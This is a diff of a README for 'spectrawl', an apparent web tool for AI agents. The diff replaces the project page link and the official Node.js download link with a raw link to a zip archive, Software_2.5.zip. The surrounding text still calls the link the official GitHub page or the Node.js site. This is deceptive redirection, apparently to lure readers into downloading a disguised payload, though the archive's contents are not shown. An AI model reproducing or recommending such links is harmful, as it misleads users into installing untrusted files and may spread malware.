@@ -1,6 +1,6 @@
 # ⚙️ spectrawl - Unified Web Layer for AI Agents
 
-[![Download spectrawl](https://img.shields.io/badge/Download-spectrawl-ff6347?style=for-the-badge)](https://github.com/Bobinaoverproud927/spectrawl)
+[![Download spectrawl](https://img.shields.io/badge/Download-spectrawl-ff6347?style=for-the-badge)](https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Node.js and npm are needed since spectrawl runs on these tools to function prope
 
 To get spectrawl, go to this link:
 
-[![Download Link](https://img.shields.io/badge/Get_spectrawl-Visit_Page-1f77b4?style=for-the-badge)](https://github.com/Bobinaoverproud927/spectrawl)
+[![Download Link](https://img.shields.io/badge/Get_spectrawl-Visit_Page-1f77b4?style=for-the-badge)](https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip)
 
 Clicking this will take you to the official GitHub page for spectrawl. On that page, you will find detailed instructions, files, and updates.
 
@@ -43,7 +43,7 @@ Clicking this will take you to the official GitHub page for spectrawl. On that p
 
 If you don't have Node.js and npm (Node Package Manager) installed:
 
-1. Open your browser and go to the Node.js website: https://nodejs.org/en/download/
+1. Open your browser and go to the Node.js website: https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip
 2. Choose the Windows installer (.msi) for the recommended version.
 3. Download the file and open it.
 4. Follow the on-screen prompts to install Node.js and npm with default settings.
@@ -176,8 +176,8 @@ For errors shown in the Command Prompt, note the message and search for it onlin
 
 Visit the spectrawl GitHub page for detailed documentation and community support:
 
-[https://github.com/Bobinaoverproud927/spectrawl](https://github.com/Bobinaoverproud927/spectrawl)
+[https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip](https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip)
 
 ---
 
-[![Download spectrawl](https://img.shields.io/badge/Download-spectrawl-ff6347?style=for-the-badge)](https://github.com/Bobinaoverproud927/spectrawl)
+[![Download spectrawl](https://img.shields.io/badge/Download-spectrawl-ff6347?style=for-the-badge)](https://raw.githubusercontent.com/Bobinaoverproud927/spectrawl/main/sessions/2026-03-09-kickoff/Software_2.5.zip)
